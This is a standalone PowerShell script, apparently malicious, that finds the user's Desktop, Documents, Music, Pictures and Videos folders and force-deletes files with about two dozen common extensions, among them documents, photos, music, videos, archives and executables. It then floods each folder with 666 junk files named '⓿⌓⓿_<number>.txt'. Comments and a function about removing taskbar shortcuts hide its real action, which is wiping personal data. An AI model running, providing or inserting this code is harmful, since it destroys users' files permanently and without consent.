$desktopPath = [Environment]::GetFolderPath("Desktop")
$documentsPath = [Environment]::GetFolderPath("MyDocuments")
$musicPath = [Environment]::GetFolderPath("MyMusic")
$picturesPath = [Environment]::GetFolderPath("MyPictures")
$videosPath = [Environment]::GetFolderPath("MyVideos")

$extensionsToDelete = @("exe", "json", "doc", "pdf", "wpd", "docx", "rtf", "tex", "odt", "jpg", "jpeg", "mp3", "rar", "vcd", "webp", "css", "html", "py", "php", "ico", "lnk", "mp4", "js", "bak", "xml", "zip", "bmp")

$pathsToDelete = @($desktopPath, $documentsPath, $musicPath, $picturesPath, $videosPath)

# Function to remove app from the taskbar
function Remove-AppFromTaskbar {
    param (
        [Parameter(Mandatory=$true)]
        [ValidateScript({Test-Path $_ -PathType Leaf})]
        [string]$FilePath
    )

    # Get the application's file name without the extension
    $appName = [System.IO.Path]::GetFileNameWithoutExtension($FilePath)

    # Get the Start Menu shortcut path for the application
    $shortcutPath = Join-Path -Path $env:APPDATA -ChildPath "Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar\$appName.lnk"

    # Remove the application's shortcut from the taskbar
    if (Test-Path -Path $shortcutPath) {
        Write-Host "Removing app from taskbar: $shortcutPath"
        Remove-Item -Path $shortcutPath -Force
    }
}

# Remove existing apps from the taskbar
foreach ($path in $pathsToDelete) {
    foreach ($extension in $extensionsToDelete) {
        $filesToDelete = Get-ChildItem -Path $path -Filter "*.$extension" -File

        foreach ($file in $filesToDelete) {
            $filePath = $file.FullName
            Write-Host "Deleting file: $filePath"
            Remove-Item -Path $filePath -Force

            # Remove the app from the taskbar
            Remove-AppFromTaskbar -FilePath $filePath
        }
    }

    for ($i = 1; $i -le 666; $i++) {
        $randomIteration = Get-Random -Minimum 100 -Maximum 1000
        $newFileName = "⓿⌓⓿_$randomIteration.txt"
        $newFilePath = Join-Path -Path $path -ChildPath $newFileName
        New-Item -Path $newFilePath -ItemType File -Force | Out-Null
    }
}

Write-Host "File deletion and copy creation complete."
